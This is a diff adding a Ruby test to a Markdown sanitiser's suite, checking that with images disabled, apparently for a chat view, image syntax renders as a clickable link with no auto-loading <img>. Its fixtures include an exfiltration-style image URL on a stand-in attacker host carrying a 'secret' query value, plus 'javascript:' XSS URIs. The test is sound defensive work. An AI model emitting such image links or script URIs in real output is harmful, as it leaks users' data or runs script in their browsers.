@@ -44,4 +44,15 @@ class SafeMarkdownTest < ActiveSupport::TestCase
     refute SafeMarkdown.safe_url?("java\nscript:alert(1)")
     refute SafeMarkdown.safe_url?("\tjavascript:alert(1)")
   end
+
+  test "images: false (the chat) renders a Markdown image as a link, so nothing loads without a click" do
+    html = SafeMarkdown.render("Look ![chart](https://evil.example/x.png?q=secret) and ![](https://evil.example/y.png)", images: false)
+
+    assert_not_includes html, "<img"
+    assert_equal [ "https://evil.example/x.png?q=secret", "https://evil.example/y.png" ], hrefs(html)
+    assert_includes html, ">chart</a>"
+    assert_includes html, ">image</a>"
+    assert_includes SafeMarkdown.render("![a](https://example.com/a.png)"), "<img", "the docs pages still draw images"
+    assert_not_includes SafeMarkdown.render("![a](javascript:alert(1))", images: false), "href"
+  end
 end
